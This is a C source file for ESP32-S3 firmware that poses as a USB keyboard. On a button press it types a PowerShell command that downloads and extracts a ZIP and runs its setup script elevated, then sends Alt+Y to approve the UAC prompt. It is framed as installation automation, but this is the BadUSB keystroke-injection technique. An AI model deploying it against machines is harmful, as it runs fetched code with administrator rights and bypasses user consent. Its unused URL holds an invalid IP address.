/*
 * ESP32-S3 USB HID Otomasyon Kodu
 * Amaç: PowerShell komutu ile ZIP indir, Ayıkla ve Kurulum betiğini Yönetici olarak çalıştır.
 * Klavye Düzeni: Türkçe Q (TR-Q) uyumludur.
 */

#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "tinyusb.h"
#include "class/hid/hid_device.h"
#include "driver/gpio.h"

// --- Sabitler ---
#define APP_BUTTON (GPIO_NUM_0) // Tetikleyici Buton (Genellikle BOOT butonu)
static const char *TAG = "HID_AUTO";
 
// Sunucunuzun IP adresi ve dosya yolu
// **BURAYI KENDİ SUNUCU ADRESİNİZLE DEĞİŞTİRİN**
const char* DOWNLOAD_URL = "http://192.168.999.999/proje.zip"; 
// Tek satırlık tam otomasyon komutu: İndir, Ayıkla ve Yönetici olarak Kurulum betiğini çalıştır.
// Dikkat: Bu string'deki karakterler, aşağıdaki send_string fonksiyonunda TR-Q klavye düzenine çevrilecektir.
const char* POWERSHELL_COMMAND = 
    "powershell -c \"Invoke-WebRequest -Uri 'http://localhost/proje.zip' -OutFile $env:TEMP\\proje.zip; Expand-Archive -Path $env:TEMP\\proje.zip -DestinationPath 'C:\\Web' -Force; Start-Process 'C:\\Web\\kurulum.ps1' -Verb RunAs\"";

// --- TinyUSB HID Fonksiyonları ---

static void send_keyboard_report(uint8_t modifier, const uint8_t keycodes[6]) {
    while (!tud_hid_ready()) {
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, modifier, keycodes);
}

static void release_keyboard(void) {
    // Tüm tuşları serbest bırakmak için boş rapor gönderir
    send_keyboard_report(0, (const uint8_t*)0);
}

// Bir tuşa basmayı ve bırakmayı gerçekleştiren yardımcı fonksiyon
static void press_and_release(uint8_t modifier, uint8_t keycode) {
    uint8_t key[6] = {keycode, 0, 0, 0, 0, 0};
    send_keyboard_report(modifier, key);
    vTaskDelay(pdMS_TO_TICKS(40));
    release_keyboard();
    vTaskDelay(pdMS_TO_TICKS(40));
}

// Bir metin dizisini (string) gönderen ana fonksiyon
static void send_string(const char *str) {
    for (size_t i = 0; i < strlen(str); i++) {
        uint8_t modifier = 0;
        uint8_t keycode = 0;

        switch (str[i]) {
            case ' ': keycode = HID_KEY_SPACE; break;
            
            // --- SENİN VERDİĞİN ÖZEL KARAKTER HARİTASI UYGULAMASI ---
            
            // 1. İstenen: - (Tire) -> Basılacak: = (Eşittir)
            case '-': keycode = HID_KEY_EQUAL; break; 

            // 2. İstenen: " (Çift Tırnak) -> Basılacak: ` (Backtick)
            case '"': keycode = HID_KEY_GRAVE; break; 
            
            // 3. İstenen: i (küçük i) -> Basılacak: ' (Tek Tırnak)
            case 'i': keycode = HID_KEY_APOSTROPHE; break; 

            // 4. İstenen: ' (Tek Tırnak) -> Basılacak: @ (Shift + 2)
            case '\'': 
                keycode = HID_KEY_2;
                modifier = KEYBOARD_MODIFIER_LEFTSHIFT; 
                break; 

            // 5. İstenen: : (İki Nokta) -> Basılacak: ? (Shift + /)
            case ':': 
                keycode = HID_KEY_SLASH;
                modifier = KEYBOARD_MODIFIER_LEFTSHIFT; 
                break;
            
            // 6. İstenen: / (Eğik Çizgi) -> Basılacak: & (Shift + 7)
            case '/': 
                keycode = HID_KEY_7;
                modifier = KEYBOARD_MODIFIER_LEFTSHIFT;
                break;
            
            // 7. İstenen: $ (Dolar) -> Basılacak: AltGr + 4
            case '$': 
                keycode = HID_KEY_4;
                modifier = KEYBOARD_MODIFIER_RIGHTALT;
                break;
            
            // 8. İstenen: \ (Ters Eğik Çizgi) -> Basılacak: AltGr + - (Tire)
            case '\\': 
                keycode = HID_KEY_MINUS; 
                modifier = KEYBOARD_MODIFIER_RIGHTALT; 
                break;
            
            // 9. İstenen: ; (Noktalı Virgül) -> Basılacak: | (Shift + \)
            case ';': 
                keycode = HID_KEY_BACKSLASH; 
                modifier = KEYBOARD_MODIFIER_LEFTSHIFT; 
                break;
            
            // 10. İstenen: . (Nokta) -> (Bu listende yoktu, ancak komutun için gerekli)
            case '.': keycode = HID_KEY_SLASH; break;


            // --- Harf ve Rakamlar (GENEL) ---
            default:
                // Küçük harfler (a-z) (i harfi yukarıda düzeltildi)
                if (str[i] >= 'a' && str[i] <= 'z') {
                    // i harfi dışındaki küçük harfler
                    if (str[i] != 'i') {
                        keycode = HID_KEY_A + (str[i] - 'a');
                    } else {
                        // Eğer 'i' harfi geldi ve case 'i' tarafından yakalanmadıysa, bu satırı görmezden geliriz.
                        // Normalde bu mantıksal olarak yukarıda yakalanmalıdır.
                        continue;
                    }
                } 
                // Büyük harfler (A-Z)
                else if (str[i] >= 'A' && str[i] <= 'Z') {
                    modifier = KEYBOARD_MODIFIER_LEFTSHIFT;
                    keycode = HID_KEY_A + (str[i] - 'A');
                } 
                // Rakamlar (0-9)
                else if (str[i] >= '0' && str[i] <= '9') {
                    // Sayı satırı tuşları (1'den 9'a ve 0)
                    if (str[i] == '0') keycode = HID_KEY_0;
                    else keycode = HID_KEY_1 + (str[i] - '1');
                } 
                else {
                    ESP_LOGW(TAG, "Bilinmeyen karakter atlandi: %c", str[i]);
                    continue; 
                }
                break;
        }

        // HID Raporunu gönder
        press_and_release(modifier, keycode);
    }
}
    
// --- Ana Otomasyon Mantığı ---

static void app_send_hid_automation(void)
{
    ESP_LOGI(TAG, "Otomasyon Basladi: Win+R ve PowerShell Komutu Gonderiliyor.");
    
    // 1. ADIM: Win + R tuşuna bas (Çalıştır'ı açar)
    press_and_release(KEYBOARD_MODIFIER_LEFTGUI, HID_KEY_R);
    vTaskDelay(pdMS_TO_TICKS(600)); // Pencerenin açılması için bekleme süresi

    // 2. ADIM: Komutu yaz (İndirme, Ayıklama ve Yönetici Çalıştırma)
    send_string(POWERSHELL_COMMAND);

    // 3. ADIM: Enter tuşuna bas (Komutu çalıştırır)
    press_and_release(0, HID_KEY_ENTER);
    
    // 4. ADIM: Yönetici Onayını (UAC) bekle ve onayla
    
    ESP_LOGI(TAG, "UAC penceresi icin bekleniyor...");
    vTaskDelay(pdMS_TO_TICKS(3000)); // UAC penceresinin açılması için bekleme süresi

    // Alt + Y (UAC onay penceresinde "Evet" seçeneğini seçer)
    ESP_LOGI(TAG, "UAC onaylamak icin Alt+Y gonderiliyor.");
    send_keyboard_report(KEYBOARD_MODIFIER_LEFTALT, (const uint8_t[]){HID_KEY_Y, 0, 0, 0, 0, 0});
    vTaskDelay(pdMS_TO_TICKS(80));
    release_keyboard();

    ESP_LOGI(TAG, "Otomasyon tamamlandi. Kurulum betigi calisiyor olmali.");
}


// --- TinyUSB Descriptor'ları (Önceki Kodunuzdan Alınmıştır) ---

#define TUSB_DESC_TOTAL_LEN (TUD_CONFIG_DESC_LEN + CFG_TUD_HID * TUD_HID_DESC_LEN)
const uint8_t hid_report_descriptor[] = {
    TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(HID_ITF_PROTOCOL_KEYBOARD)),
    TUD_HID_REPORT_DESC_MOUSE(HID_REPORT_ID(HID_ITF_PROTOCOL_MOUSE))
};
const char* hid_string_descriptor[5] = {
    (char[]){0x09, 0x04}, // Dil (US English)
    "ESP32-S3 HID",
    "Automation Device",
    "123456",
    "HID Keyboard/Mouse",
};
static const uint8_t hid_configuration_descriptor[] = {
    TUD_CONFIG_DESCRIPTOR(1, 1, 0, TUSB_DESC_TOTAL_LEN, TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 100),
    TUD_HID_DESCRIPTOR(0, 4, false, sizeof(hid_report_descriptor), 0x81, 16, 10),
};

uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance) { return hid_report_descriptor; }
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen) { return 0; }
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize) { }


// --- Ana Uygulama ---

void app_main(void)
{
    // Buton konfigürasyonu (GPIO 0 - BOOT tuşu)
    const gpio_config_t boot_button_config = {
        .pin_bit_mask = BIT64(APP_BUTTON),
        .mode = GPIO_MODE_INPUT,
        .intr_type = GPIO_INTR_DISABLE,
        .pull_up_en = true, 
        .pull_down_en = false,
    };
    ESP_ERROR_CHECK(gpio_config(&boot_button_config));

    // TinyUSB Sürücüsünü Kur
    ESP_LOGI(TAG, "USB initialization");
    const tinyusb_config_t tusb_cfg = {
        .device_descriptor = NULL,
        .string_descriptor = hid_string_descriptor,
        .string_descriptor_count = sizeof(hid_string_descriptor) / sizeof(hid_string_descriptor[0]),
        .external_phy = false,
#if (TUD_OPT_HIGH_SPEED)
        .fs_configuration_descriptor = hid_configuration_descriptor, 
        .hs_configuration_descriptor = hid_configuration_descriptor,
        .qualifier_descriptor = NULL,
#else
        .configuration_descriptor = hid_configuration_descriptor,
#endif 
    };

    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
    ESP_LOGI(TAG, "USB initialization DONE");

    static bool button_was_pressed = false;

    // Ana Döngü
    while (1) {
        if (tud_mounted()) {
            bool button_pressed = !gpio_get_level(APP_BUTTON);

            // Butona basıldığında otomasyonu başlat
            if (button_pressed && !button_was_pressed) {
                app_send_hid_automation();
            }

            button_was_pressed = button_pressed;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}